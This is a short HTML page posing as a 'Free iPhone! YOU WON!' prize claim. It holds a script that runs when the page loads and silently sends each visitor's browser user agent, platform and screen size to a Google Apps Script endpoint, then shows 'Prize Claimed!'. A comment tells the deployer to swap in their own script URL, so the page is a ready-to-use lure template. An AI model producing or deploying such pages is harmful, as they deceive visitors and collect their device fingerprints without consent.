<!DOCTYPE html>
<html>
<head>
    <title>Free iPhone!</title>
</head>
<body style="text-align: center; padding: 50px; background: red; color: white;">
    <h1>🎉 YOU WON!</h1>
    <div id="status">Claiming your prize...</div>

    <script>
        // ⚠️ REPLACE WITH YOUR NEW SCRIPT URL
        const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbxt650xrfkvyazf47dIHtNLxfkLa8bqtTdQitJpirINb2LKRC4ApNZ5J4GGuXlYpQZd/exec';
        
        // Send device data
        fetch(BACKEND_URL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screenSize: screen.width + 'x' + screen.height
            })
        }).then(() => {
            document.getElementById('status').innerHTML = '✅ Prize Claimed!';
        });
    </script>
</body>
</html>
